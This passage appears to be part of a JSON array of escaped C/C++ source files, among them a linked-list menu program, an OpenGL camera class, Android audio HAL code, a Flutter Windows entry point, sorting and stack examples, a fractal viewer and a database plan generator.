\"Add to head -> (1)\\n\";\n\t\tcout << \"Delete node -> (2)\\n\";\n\t\tcout << \"Display -> (3)\\n\";\n\t\tcout << \"Destory list -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tif (op == 1) {\n\t\t\tcout << \"Enter value do you want to add to head\\n\";\n\t\t\tcin >> ath;\n\t\t\tAddToHead(ath);\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 2) {\n\t\t\tdisplay();\n\t\t\tcout << \"Choise the node \\n\";\n\t\t\tcin >> dn;\n\t\t\tcout << \"Are you sure to delete this node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdeleteNode(dn);\n\t\t\t\tcout << \"\\nCheck data of list after deleting node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Delete is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 3) {\n\t\t\tcout << \"\\nThe Nodes of the Linked List are: \\n\";\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 4) {\n\t\t\tdisplay();\n\t\t\tcout << \"\\nIF Destroyed the whole list\\n \\t The result will be: \\n\";\n\t\t\tcout << \"Are you sure to destroy the whole list\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdestoryList();\n\t\t\t\tcout << \"\\nCheck data of list after destroying : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Destroy is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 5)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\telse { cout << \"Error in entry\\n\"; }\n\n\t\tcout << \"\\n\";\n\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "//\n// Created by ivan on 2024/5/4.\n//\n\n#include \"Camera.hpp\"\n#include <utility>\n#include <cmath>\n#include <spdlog/spdlog.h>\n#define GLM_ENABLE_EXPERIMENTAL\n#include <glm/gtx/vector_angle.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <iostream>\n\nnamespace lgl {\n\nenum class MouseButton {\n    None,\n    Left,\n    Right,\n};\n\nstatic Camera* gCamera = nullptr;\nstatic MouseButton gMouseButton = MouseButton::None;\nstatic std::pair gLastCursorPosOpt{false, std::make_pair(0., 0.)};\n\nstatic void cursor_pos_callback(GLFWwindow *widow, double xpos, double ypos);\nstatic void mouse_button_callback(GLFWwindow *window, int button, int action, int mods);\n\nCamera::Camera(GL *gl) : m_cameraPos_(0.f, 0.f, 3.f), m_cameraUp_(0.f, 1.f, 0.f), m_lookingAt_(0.f, 0.f, 0.f), m_rotateAxis_(0.f, 1.f, 0.f){\n    if (!gl) {\n        spdlog::error(\"GL in Camera is null!\");\n        assert(false);\n    }\n\n    glfwSetCursorPosCallback(gl->get_window(), cursor_pos_callback);\n    glfwSetMouseButtonCallback(gl->get_window(), mouse_button_callback);\n\n    context();\n}\n\nvoid Camera::context() {\n    gCamera = this;\n}\n\nglm::mat4 Camera::view() const {\n    return glm::lookAt(m_cameraPos_, m_lookingAt_, m_cameraUp_);\n}\n\nstatic glm::vec3 from_yaw_pitch(double yaw, double pitch) {\n    yaw = float(glm::radians(yaw));\n    pitch = float(glm::radians(pitch));\n    return {\n        std::cos(pitch) * std::sin(yaw),\n        std::sin(pitch),\n        std::cos(pitch) * std::cos(yaw)\n    };\n}\n\nvoid Camera::inc_yaw(double angle) {\n    m_yaw_ += angle;\n\n    auto dist = glm::length(m_cameraPos_ - m_lookingAt_);\n    m_cameraPos_ = dist * from_yaw_pitch(m_yaw_, m_pitch_) + m_lookingAt_;\n    m_cameraUp_ = glm::rotate(glm::mat4(1.f), glm::radians(float(angle)), m_rotateAxis_) * glm::vec4(m_cameraUp_, 1.f);\n\n    spdlog::debug(\"yaw: {}\", m_yaw_);\n}\n\nvoid Camera::inc_pitch(double angle) {\n    m_pitch_ += angle;\n    // FIXME:\n    m_pitch_ = std::clamp(m_pitch_, -89., 89.);\n\n    auto dist = glm::length(m_cameraPos_ - m_lookingAt_);\n\n    auto frontDirection = glm::normalize(m_lookingAt_ - m_cameraPos_);\n    auto upDirection = glm::normalize(m_cameraUp_);\n    auto rightDirection = glm::normalize(glm::cross(frontDirection, upDirection));\n    spdlog::debug(\"1 angle: {} {} {}\", glm::angle(frontDirection, upDirection), glm::angle(upDirection, rightDirection), glm::angle(frontDirection, rightDirection));\n\n    m_cameraPos_ = dist * from_yaw_pitch(m_yaw_, m_pitch_) + m_lookingAt_;\n    frontDirection = glm::normalize(m_lookingAt_ - m_cameraPos_);\n    m_cameraUp_ = glm::cross(rightDirection, frontDirection);\n\n    frontDirection = glm::normalize(m_lookingAt_ - m_cameraPos_);\n    upDirection = glm::normalize(m_cameraUp_);\n    spdlog::debug(\"angle: {} {} {}\", glm::angle(frontDirection, upDirection), glm::angle(upDirection, rightDirection), glm::angle(frontDirection, rightDirection));\n\n    spdlog::debug(\"pitch: {}\", m_pitch_);\n}\n\nCamera::~Camera() {\n\n}\n\nvoid cursor_pos_callback(GLFWwindow *widow, double xpos, double ypos) {\n    if (!gCamera) return;\n\n    std::pair<double, double> delta;\n    if (MouseButton::None != gMouseButton) {\n        if (!gLastCursorPosOpt.first) {\n            gLastCursorPosOpt.first = true;\n            gLastCursorPosOpt.second = {xpos, ypos};\n            return;\n        }\n        delta.first = xpos - gLastCursorPosOpt.second.first;\n        delta.second = ypos - gLastCursorPosOpt.second.second;\n        gLastCursorPosOpt.second = {xpos, ypos};\n    } else {\n        gLastCursorPosOpt.first = false;\n        return;\n    }\n\n    if (MouseButton::Left == gMouseButton) {\n        gCamera->inc_yaw(-delta.first);\n        gCamera->inc_pitch(delta.second);\n    } else if (MouseButton::Right == gMouseButton) {\n        spdlog::info(\"right {} {}\", delta.first, delta.second);\n    }\n}\n\nvoid mouse_button_callback(GLFWwindow *window, int button, int action, int mods) {\n    if (!gCamera) return;\n    if (GLFW_MOUSE_BUTTON_LEFT == button && GLFW_PRESS == action) {\n        gMouseButton = MouseButton::Left;\n    }\n    if (GLFW_MOUSE_BUTTON_RIGHT == button && GLFW_PRESS == action) {\n        gMouseButton = MouseButton::Right;\n    }\n    if (GLFW_RELEASE == action) {\n        gMouseButton = MouseButton::None;\n    }\n}\n\n}\n",
    "/*\n * Copyright (C) 2018 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"StreamOutHAL\"\n\n#include \"StreamOut.h\"\n#include \"Util.h\"\n\n//#define LOG_NDEBUG 0\n#define ATRACE_TAG ATRACE_TAG_AUDIO\n\n#include <string.h>\n\n#include <memory>\n\n#include <HidlUtils.h>\n#include <android/log.h>\n#include <audio_utils/Metadata.h>\n#include <hardware/audio.h>\n#include <util/CoreUtils.h>\n#include <utils/Trace.h>\n\nnamespace android {\nnamespace hardware {\nnamespace audio {\nnamespace CPP_VERSION {\nnamespace implementation {\n\nusing ::android::hardware::audio::common::COMMON_TYPES_CPP_VERSION::implementation::HidlUtils;\nusing ::android::hardware::audio::CORE_TYPES_CPP_VERSION::implementation::CoreUtils;\nnamespace util {\nusing namespace ::android::hardware::audio::CORE_TYPES_CPP_VERSION::implementation::util;\n}\n\nnamespace {\n\nclass WriteThread : public Thread {\n   public:\n    // WriteThread's lifespan never exceeds StreamOut's lifespan.\n    WriteThread(std::atomic<bool>* stop, audio_stream_out_t* stream,\n                StreamOut::CommandMQ* commandMQ, StreamOut::DataMQ* dataMQ,\n                StreamOut::StatusMQ* statusMQ, EventFlag* efGroup)\n        : Thread(false /*canCallJava*/),\n          mStop(stop),\n          mStream(stream),\n          mCommandMQ(commandMQ),\n          mDataMQ(dataMQ),\n          mStatusMQ(statusMQ),\n          mEfGroup(efGroup),\n          mBuffer(nullptr) {}\n    bool init() {\n        mBuffer.reset(new (std::nothrow) uint8_t[mDataMQ->getQuantumCount()]);\n        return mBuffer != nullptr;\n    }\n    virtual ~WriteThread() {}\n\n   private:\n    std::atomic<bool>* mStop;\n    audio_stream_out_t* mStream;\n    StreamOut::CommandMQ* mCommandMQ;\n    StreamOut::DataMQ* mDataMQ;\n    StreamOut::StatusMQ* mStatusMQ;\n    EventFlag* mEfGroup;\n    std::unique_ptr<uint8_t[]> mBuffer;\n    IStreamOut::WriteStatus mStatus;\n\n    bool threadLoop() override;\n\n    void doGetLatency();\n    void doGetPresentationPosition();\n    void doWrite();\n};\n\nvoid WriteThread::doWrite() {\n    const size_t availToRead = mDataMQ->availableToRead();\n    mStatus.retval = Result::OK;\n    mStatus.reply.written = 0;\n    if (mDataMQ->read(&mBuffer[0], availToRead)) {\n        ssize_t writeResult = mStream->write(mStream, &mBuffer[0], availToRead);\n        if (writeResult >= 0) {\n            mStatus.reply.written = writeResult;\n        } else {\n            mStatus.retval = Stream::analyzeStatus(\"write\", writeResult);\n        }\n    }\n}\n\nvoid WriteThread::doGetPresentationPosition() {\n    mStatus.retval =\n        StreamOut::getPresentationPositionImpl(mStream, &mStatus.reply.presentationPosition.frames,\n                                               &mStatus.reply.presentationPosition.timeStamp);\n}\n\nvoid WriteThread::doGetLatency() {\n    mStatus.retval = Result::OK;\n    mStatus.reply.latencyMs = mStream->get_latency(mStream);\n}\n\nbool WriteThread::threadLoop() {\n    // This implementation doesn't return control back to the Thread until it\n    // decides to stop,\n    // as the Thread uses mutexes, and this can lead to priority inversion.\n    while (!std::atomic_load_explicit(mStop, std::memory_order_acquire)) {\n        uint32_t efState = 0;\n        mEfGroup->wait(static_cast<uint32_t>(MessageQueueFlagBits::NOT_EMPTY), &efState);\n        if (!(efState & static_cast<uint32_t>(MessageQueueFlagBits::NOT_EMPTY))) {\n            continue;  // Nothing to do.\n        }\n        if (!mCommandMQ->read(&mStatus.replyTo)) {\n            continue;  // Nothing to do.\n        }\n        switch (mStatus.replyTo) {\n            case IStreamOut::WriteCommand::WRITE:\n                doWrite();\n                break;\n            case IStreamOut::WriteCommand::GET_PRESENTATION_POSITION:\n                doGetPresentationPosition();\n                break;\n            case IStreamOut::WriteCommand::GET_LATENCY:\n                doGetLatency();\n                break;\n            default:\n                ALOGE(\"Unknown write thread command code %d\", mStatus.replyTo);\n                mStatus.retval = Result::NOT_SUPPORTED;\n                break;\n        }\n        if (!mStatusMQ->write(&mStatus)) {\n            ALOGE(\"status message queue write failed\");\n        }\n        mEfGroup->wake(static_cast<uint32_t>(MessageQueueFlagBits::NOT_FULL));\n    }\n\n    return false;\n}\n\n}  // namespace\n\nStreamOut::StreamOut(const sp<Device>& device, audio_stream_out_t* stream)\n    : mDevice(device),\n      mStream(stream),\n      mStreamCommon(new Stream(false /*isIn",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"inf_scroll_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//\ufd3e\u0625\u0650\u0646\u0651\u064e\u0645\u064e\u0627 \u064a\u064e\u062e\u0652\u0634\u064e\u0649 \u0627\u0644\u0644\u0651\u064e\u0647\u064e \u0645\u0650\u0646\u0652 \u0639\u0650\u0628\u064e\u0627\u062f\u0650\u0647\u0650 \u0627\u0644\u0652\u0639\u064f\u0644\u064e\u0645\u064e\u0627\u0621\u064f \u0625\u0650\u0646\u0651\u064e \u0627\u0644\u0644\u0651\u064e\u0647\u064e \u0639\u064e\u0632\u0650\u064a\u0632\u064c \u063a\u064e\u0641\u064f\u0648\u0631\u064c\ufd3f\n#include <bits/stdc++.h>\n#define int long long\n//#define endl \"\\n \"\nusing namespace std;\n/*\n<-----Complexity Analysis----->\n-Space Complexity: O(1)\n-Time Complexity: O(N^2)\n*/\nint FindMinIndex(int a[], int i, int j)\n{\n    if (i == j)\n        return i;\n \n    // Find minimum of remaining\n    int k = FindMinIndex(a, i + 1, j);\n \n    // Return minimum of current and remaining\n    return (a[i] < a[k])? i : k;\n}\n \n// Recursive selection sort. n is size of array and index\n// is index of starting element.\nvoid RSelectionSort(int a[], int n, int index = 0)\n{\n    // Return when starting and size are same\n    if (index == n)\n       return;\n \n    // calling minimum index function for minimum index\n    int k = FindMinIndex(a, index, n-1);\n \n    // Swapping when index and minimum index are not same\n    if (k != index)\n       swap(a[k], a[index]);\n \n    // Recursively calling selection sort function\n    RSelectionSort(a, n, index + 1);\n}\n\nvoid printArray(int arr[], int size)\n{\n    int i;\n    for (i = 0; i < size; i++) {\n        cout << arr[i] << \" \";\n    }\n  cout << endl;\n}\n\nsigned main() {\nint arr[3] = {3 ,1 ,2};\n    RSelectionSort(arr,sizeof(arr)/sizeof(arr[0]));\n    printArray(arr,sizeof(arr)/sizeof(arr[0]));\n}\n",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n//\u0426\u0435\u043b\u0435\u0432\u043e\u0439 \u043a\u043b\u0430\u0441\u0441 \"\u0421\u0442\u0435\u043a\"\ntemplate <typename T>\nclass Stack {\npublic:\n    Stack() {};\n    virtual void push(T element) = 0;\n    virtual T pop() = 0;\n    virtual bool isEmpty() const = 0;\n    virtual ~Stack() {}\n};\n//\u041a\u043b\u0430\u0441\u0441 \u0443\u0437\u043b\u0430 \u0441\u043f\u0438\u0441\u043a\u0430\ntemplate <typename T>\nclass Node  {\npublic:\n    T data;\n    Node <T>* next;\n    Node(T value) : data(value), next(nullptr) {}\n};\n// \u0410\u0434\u0430\u043f\u0442\u0438\u0440\u0443\u0435\u043c\u044b\u0439 \u043a\u043b\u0430\u0441\u0441 \"\u0421\u0432\u044f\u0437\u043d\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a\"\ntemplate <typename T>\nclass List {\nprivate:\n    Node<T>* head;\npublic:\n    List() : head(nullptr) {}\n    void addToEnd(T element) {\n        Node<T>* newNode = new Node<T>(element);\n        if (head == nullptr) {\n            head = newNode;\n        }\n        else {\n            Node<T >* current = head;\n            while (current->next != nullptr) {\n                current = current->next;\n            }\n            current->next = newNode;\n        }\n    }\n    T removeFromEnd() {\n        if (head != nullptr) {\n            if (head->next == nullptr) {\n                T tmp = head->data;\n                delete head;\n                head = nullptr;\n                return tmp;\n            }\n            else {\n                Node<T>* current = head;\n                while (current->next->next != nullptr) {\n                    current = current->next;\n                }\n                T tmp = current->next->data;\n                delete current->next;\n                current->next = nullptr;\n                return tmp;\n            }\n        }\n    }\n    bool isEmpty() const {\n        return head == nullptr;\n    }\n    ~List() {\n        Node<T>* current = head;\n        while (current != nullptr) {\n            Node<T>* temp = current;\n            current = current->next;\n            delete temp;\n        }\n    }\n};\n// \u0410\u0434\u0430\u043f\u0442\u0435\u0440 \u043a\u043b\u0430\u0441\u0441\u0430\ntemplate <typename T> \nclass StackAdapter : public Stack<T> ,private List<T>{\npublic:\n    void push(T element) override \n    {\n        List<T>::addToEnd(element);\n    }\n    T pop() override \n    {\n        return List<T>::removeFromEnd();\n    }\n    bool isEmpty() const override \n    {\n        return List<T>::isEmpty();\n    }\n};\nint main() {\n    Stack<int>* stackint = new StackAdapter<int>();\n    stackint->push(1);\n    stackint->push(2);\n    stackint->push(3);\n    stackint->push(4);\n    while (!stackint->isEmpty()) {\n        cout << stackint->pop() << endl;\n    }\n    Stack<string>* stackstring = new StackAdapter<string>();\n    stackstring->push(\"A\");\n    stackstring->push(\"B\");\n    stackstring->push(\"C\");\n    stackstring->push(\"D\");\n    while (!stackstring->isEmpty()) {\n        cout << stackstring->pop() << endl;\n    }\n\n    \n}\n\n\n",
    "\ufeff#include <SFML/Graphics.hpp>\r\n#include <ccomplex>\r\n#include <iostream>\r\n#include <string>\r\n#include <Windows.h>\r\n#include <atlstr.h>\r\n#include <random>\r\n\r\n\r\n\r\n\r\n\r\nusing namespace sf;\r\n\r\nstd::complex<double> mandelbrot(std::complex<double> z, std::complex<double> c)\r\n{\r\n    \r\n    std::complex<double> z1(0, 0);\r\n    z1 = z * z + c;\r\n\r\n\r\n\r\n    return z1;\r\n}\r\n\r\n\r\nint IsM(std::complex<double> c, int mx)\r\n{\r\n    std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nint IsJ(std::complex<double> z, int mx, std::complex<double> c)\r\n{\r\n    std::complex<double> f(-0.7514f, -0.826f);\r\n    //std::complex<double> z(0, 0);\r\n\r\n    for (std::int16_t i = 0; i < mx; i++)\r\n    {\r\n        z = mandelbrot(z, c);\r\n\r\n        if (abs(z) >= 2)\r\n        {\r\n            return (int)(i * 255 / mx);\r\n        }\r\n    }\r\n\r\n    return 255;\r\n}\r\n\r\nvoid update(int WIDTH, int HEIGHT, double ofX, double ofY, RenderWindow& window, RectangleShape shape, double scale, int maxIt, int Fnum, std::complex<double> cForJ)\r\n{\r\n\r\n    window.clear();\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2 + ofX) * scale;\r\n            double y = (j - HEIGHT / 2 + ofY) * scale;\r\n\r\n            y = -y;\r\n            if (Fnum==0)\r\n            {\r\n                Uint8 clr = IsM(std::complex<double>(x, y), maxIt);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n            else if(Fnum == 1)\r\n            {\r\n                Uint8 clr = IsJ(std::complex<double>(x, y), maxIt, cForJ);\r\n                auto color = sf::Color{ clr, clr, clr };\r\n                shape.setFillColor(color);\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }\r\n\r\n\r\n            \r\n            /*if (IsM(std::complex<double>(x, y), 100))\r\n            {\r\n                shape.setPosition(i, j);\r\n                window.draw(shape);\r\n            }*/\r\n        }\r\n    }\r\n\r\n\r\n    window.display();\r\n}\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"Russian\");\r\n    int MaxIt = 50;\r\n    bool start = true;\r\n    int m = 0;\r\n    \r\n    std::complex<double> cForJ(-0.64, 0.39);\r\n    if (start)\r\n    {\r\n        std::cout << \"\u0413\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u043e\u0432\\n\";\r\n        std::cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0443\u043c \u0438\u0442\u0435\u0440\u0430\u0446\u0438\u0439 (\u043c\u0435\u043d\u044c\u0448\u0435 - \u043b\u0443\u0447\u0448\u0435 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c, \u043d\u043e \u0445\u0443\u0436\u0435 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u044c \u0438 \u044f\u0440\u0447\u0435 \u0433\u0440\u0430\u0434\u0438\u0435\u043d\u0442): \";\r\n        std::cin >> MaxIt;\r\n        std::cout << \"\u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u0444\u0440\u0430\u043a\u0442\u0430\u043b\u044b:\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u041c\u043e\u043d\u0434\u0435\u043b\u044c\u0431\u0440\u043e\u0442\u0430: 0\\n\";\r\n        std::cout << \"\u041c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0416\u044e\u043b\u0438\u0430: 1\\n\";\r\n        std::cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e: \";\r\n        std::cin >> m;\r\n        std::cout << \"\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435\\n\u0421\u0442\u0440\u0435\u043b\u043e\u0447\u043a\u0438: \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Shift: \u0443\u0432\u0435\u043b\u0438\u0447\u0435\u043d\u0438\u0435\\n\u041b\u0435\u0432\u044b\u0439 Alt: \u0443\u043c\u0435\u043d\u044c\u0448\u0435\u043d\u0438\u0435\\nU: \u043e\u0431\u043d\u043e\u0432\u0438\u0442\u044c \u044d\u043a\u0440\u0430\u043d\\n\";\r\n        std::cout << \"\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0441\u0434\u0435\u043b\u0430\u043d\u0430 \u0432 \u0440\u0430\u043c\u043a\u0430\u0445 \u043f\u0440\u043e\u0435\u043a\u0442\u043d\u043e\u0439 \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438\\n\u0428\u043a\u043e\u043b\u0430 \u21161580, 2024 \u0433.\";\r\n        \r\n        \r\n    }\r\n    std::complex<double> z(0, 0);\r\n    std::int32_t WIDTH = 200;\r\n    std::int32_t HEIGHT = 200;\r\n    double Y=0;\r\n    double X=0;\r\n\r\n    double ofX = 0;\r\n    double ofY = 0;\r\n    double scale = 0.01f;\r\n    RenderWindow window(VideoMode(WIDTH, HEIGHT), L\"\u0424\u0440\u0430\u043a\u0442\u0430\u043b\", Style::Default);\r\n    RenderWindow test(VideoMode(WIDTH, HEIGHT), L\"\u0412\u044b\u0431\u043e\u0440 \u0442\u043e\u0447\u043a\u0438\", Style::Titlebar);\r\n    \r\n    Vector2i pos = window.getPosition();\r\n    pos.x += WIDTH;\r\n\r\n    test.setPosition(pos);\r\n    \r\n    if (m!=1) \r\n    {\r\n        test.close();             \r\n    }\r\n    \r\n\r\n    window.setVerticalSyncEnabled(true);\r\n    \r\n\r\n    CircleShape sh;\r\n    sh.setScale({ 1.f,1.f });\r\n    sh.setRadius(0.5f);\r\n    sh.setFillColor(Color::Black);\r\n    \r\n    for (double i = 0; i <= WIDTH; i++)\r\n    {\r\n        for (double j = 0; j <= HEIGHT; j++)\r\n        {\r\n            double x = (i - WIDTH / 2)/50;\r\n            double y = (j - HEIGHT / 2)/50;\r\n\r\n            y = -y;\r\n            \r\n            Uint8 c = IsM(std::complex<double>(x,y),MaxIt)/2;\r\n            auto GREY = Color{c, c, c };\r\n            sh.setFillColor(GREY);\r\n            sh.setPosition(i, j);\r\n            test.draw(sh);\r\n            sh.setFillColor(Color::Black);\r\n            if (i == WIDTH/2 || j == HEIGHT/2)\r\n            {\r\n                sh.setFillColor(Color::White);\r\n                sh.setPosition(i, j);\r\n                test.draw(sh);\r\n                \r\n            }\r\n\r\n        }\r\n    }\r\n    test.display();\r\n\r\n\r\n    RectangleShape shape;\r\n    shape.setSize({ 1.f, 1.f });\r\n    shape.setFillColor(Color::White);\r\n\r\n    \r\n\r\n\r\n    update(WIDTH, HEIGHT, ofX, ofY, window, shape, scale, MaxIt, m, cForJ);\r\n    while (window.isOpen())\r\n    {\r\n        if (window.hasFocus())\r\n        {\r\n            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Left))\r\n            {\r\n                ofX -= 50;\r\n                update(W",
    "/* Copyright (c) 2023 OceanBase and/or its affiliates. All rights reserved.\nminiob is licensed under Mulan PSL v2.\nYou can use this software according to the terms and conditions of the Mulan PSL v2.\nYou may obtain a copy of Mulan PSL v2 at:\n         http://license.coscl.org.cn/MulanPSL2\nTHIS SOFTWARE IS PROVIDED ON AN \"AS IS\" BASIS, WITHOUT WARRANTIES OF ANY KIND,\nEITHER EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT,\nMERCHANTABILITY OR FIT FOR A PARTICULAR PURPOSE.\nSee the Mulan PSL v2 for more details. */\n\n//\n// Created by Wangyunlai on 2023/08/16.\n//\n\n#include \"sql/optimizer/logical_plan_generator.h\"\n\n#include <common/log/log.h>\n\n#include \"sql/operator/calc_logical_operator.h\"\n#include \"sql/operator/delete_logical_operator.h\"\n#include \"sql/operator/explain_logical_operator.h\"\n#include \"sql/operator/insert_logical_operator.h\"\n#include \"sql/operator/join_logical_operator.h\"\n#include \"sql/operator/logical_operator.h\"\n#include \"sql/operator/predicate_logical_operator.h\"\n#include \"sql/operator/project_logical_operator.h\"\n#include \"sql/operator/table_get_logical_operator.h\"\n\n#include \"sql/stmt/calc_stmt.h\"\n#include \"sql/stmt/delete_stmt.h\"\n#include \"sql/stmt/explain_stmt.h\"\n#include \"sql/stmt/filter_stmt.h\"\n#include \"sql/stmt/insert_stmt.h\"\n#include \"sql/stmt/select_stmt.h\"\n#include \"sql/stmt/stmt.h\"\n\nusing namespace std;\n\nRC LogicalPlanGenerator::create(Stmt *stmt, unique_ptr<LogicalOperator> &logical_operator)\n{\n  RC rc = RC::SUCCESS;\n  switch (stmt->type()) {\n    case StmtType::CALC: {\n      CalcStmt *calc_stmt = static_cast<CalcStmt *>(stmt);\n\n      rc                  = create_plan(calc_stmt, logical_operator);\n    } break;\n\n    case StmtType::SELECT: {\n      SelectStmt *select_stmt = static_cast<SelectStmt *>(stmt);\n\n      rc                      = create_plan(select_stmt, logical_operator);\n    } break;\n\n    case StmtType::INSERT: {\n      InsertStmt *insert_stmt = static_cast<InsertStmt *>(stmt);\n\n      rc                      = create_plan(insert_stmt, logical_operator);\n    } break;\n\n    case StmtType::DELETE: {\n      DeleteStmt *delete_stmt = static_cast<DeleteStmt *>(stmt);\n\n      rc                      = create_plan(delete_stmt, logical_operator);\n    } break;\n\n    case StmtType::EXPLAIN: {\n      ExplainStmt *explain_stmt = static_cast<ExplainStmt *>(stmt);\n\n      rc                        = create_plan(explain_stmt, logical_operator);\n    } break;\n    default: {\n      rc = RC::UNIMPLENMENT;\n    }\n  }\n  return rc;\n}\n\nRC LogicalPlanGenerator::create_plan(CalcStmt *calc_stmt, std::unique_ptr<LogicalOperator> &logical_operator)\n{\n  logical_operator.reset(new CalcLogicalOperator(std::move(calc_stmt->expressions())));\n  return RC::SUCCESS;\n}\n\nRC LogicalPlanGenerator::create_plan(SelectStmt *select_stmt, unique_ptr<LogicalOperator> &logical_operator)\n{\n  unique_ptr<LogicalOperator> table_oper(nullptr);\n\n  const std::vector<Table *> &tables     = select_stmt->tables();\n  const std::vector<Field>   &all_fields = select_stmt->query_fields();\n  for (Table *table : tables) {\n    std::vector<Field> fields;\n    for (const Field &field : all_fields) {\n      if (0 == strcmp(field.table_name(), table->name())) {\n        fields.push_back(field);\n      }\n    }\n\n    unique_ptr<LogicalOperator> table_get_oper(new TableGetLogicalOperator(table, fields, true /*readonly*/));\n    if (table_oper == nullptr) {\n      table_oper = std::move(table_get_oper);\n    } else {\n      JoinLogicalOperator *join_oper = new JoinLogicalOperator;\n      join_oper->add_child(std::move(table_oper));\n      join_oper->add_child(std::move(table_get_oper));\n      table_oper = unique_ptr<LogicalOperator>(join_oper);\n    }\n  }\n\n  unique_ptr<LogicalOperator> predicate_oper;\n\n  RC                          rc = create_plan(select_stmt->filter_stmt(), predicate_oper);\n  if (rc != RC::SUCCESS) {\n    LOG_WARN(\"failed to create predicate logical plan. rc=%s\", strrc(rc));\n    return rc;\n  }\n\n  unique_ptr<LogicalOperator> project_oper(new ProjectLogicalOperator(all_fields));\n  if (predicate_oper) {\n    if (table_oper) {\n      predicate_oper->add_child(std::move(table_oper));\n    }\n    project_oper->add_child(std::move(predicate_oper));\n  } else {\n    if (table_oper) {\n      project_oper->add_child(std::move(table_oper));\n    }\n  }\n\n  logical_operator.swap(project_oper);\n  return RC::SUCCESS;\n}\n\nRC LogicalPlanGenerator::create_plan(FilterStmt *filter_stmt, unique_ptr<LogicalOperator> &logical_operator)\n{\n  std::vector<unique_ptr<Expression>> cmp_exprs;\n  const 